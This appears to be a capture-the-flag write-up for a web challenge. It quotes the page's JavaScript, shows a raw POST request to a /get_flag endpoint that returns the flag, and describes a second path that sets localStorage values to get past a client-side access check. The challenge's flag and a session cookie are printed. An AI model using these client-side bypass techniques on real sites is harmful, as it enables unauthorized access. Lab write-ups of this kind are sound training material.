@@ -1,0 +1,121 @@
+Found the JS functions in the in the source code:
+```javascript
+       const _gtf = function() {
+            if (!window._verifyAccess()) return false;
+            
+            fetch('/get_flag', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.flag) {
+                    document.getElementById('flag-result').textContent = 'Congratulations! The flag is: ' + data.flag;
+                } else {
+                    document.getElementById('flag-result').textContent = 'Error: ' + data.error;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('flag-result').textContent = 'Error retrieving the flag. Please try again.';
+            });
+        }
+```
+
+```http
+POST /get_flag HTTP/1.1
+Host: 64.225.103.251:5007
+Cookie: session=eyJzZXNzaW9uX2lkIjoiMDk5MDA0MzQtZjNjNy00MzFiLWE2ZTQtYzhkYTVlMTViMTM2Iiwic3RhcnRfdGltZSI6MTc0NjExNjU0M30.aBOfvw.HDtWmbob0XAlyclvGZg6a-ncxmU
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-GB,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://black-pyramid.appsec.nu:8000/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+Content-Type': 'application/json
+```
+
+```http
+HTTP/1.1 200 OK
+Server: nginx/1.27.4
+Date: Thu, 01 May 2025 16:31:07 GMT
+Content-Type: application/json
+Content-Length: 45
+Connection: keep-alive
+
+{"flag":"O24{scr1b3_0f_7h3_h1dd3n_p4pyru5}"}
+
+```
+
+Another way:
+
+We can also find another function that fetches values from localStorage
+```javascript
+        (function() {
+            const _ur = "userRank";
+            const _pu = "papyrusUnlocked";
+            
+            window._checkAccess = function() {
+                const a = localStorage.getItem(_ur);
+                const b = localStorage.getItem(_pu);
+                
+                const validOptions = ['visitor', 'acolyte', 'scribe', 'royal_scribe', 'pharaoh', 'deity'];
+                const validRanks = [validOptions[2], validOptions[3], validOptions[4]];
+                
+                if (validRanks.indexOf(a) >= 0 && b === 'true') {
+                    document.getElementById('adwall').style.display = 'none';
+                    
+                    Array.from(document.querySelectorAll('.blurred-content'))
+                         .forEach(function(el) { 
+                             el.classList.remove('blurred-content'); 
+                         });
+                    
+                    const flagSection = document.querySelector('.flag-container');
+                    if (flagSection) flagSection.style.pointerEvents = 'auto';
+                }
+            };
+        })();
+```
+
+The function looks for two keys: "userRank" and "papyrusUnlocked"
+And we also see the valid options in an array:
+```javascript
+['visitor', 'acolyte', 'scribe', 'royal_scribe', 'pharaoh', 'deity'];
+```
+
+But valid ranks are set in this variable. So the only valid ranks are:  "scribe", "royal_scribe", "pharaoh"
+```javascript
+const validRanks = [validOptions[2], validOptions[3], validOptions[4]];
+```
+
+
+And this if statement checks if the users rank is within the approved "range" and that the key "papyrusUnlocked" is set to "true"
+```javascript
+if (validRanks.indexOf(a) >= 0 && b === 'true') {
+                    document.getElementById('adwall').style.display = 'none';
+                    
+                    Array.from(document.querySelectorAll('.blurred-content'))
+                         .forEach(function(el) { 
+                             el.classList.remove('blurred-content'); 
+                         });
+                    
+                    const flagSection = document.querySelector('.flag-container');
+                    if (flagSection) flagSection.style.pointerEvents = 'auto';
+                }
+```
+
+
+So let set our localStorage to the approved values
+![](AEA_Solved.png)
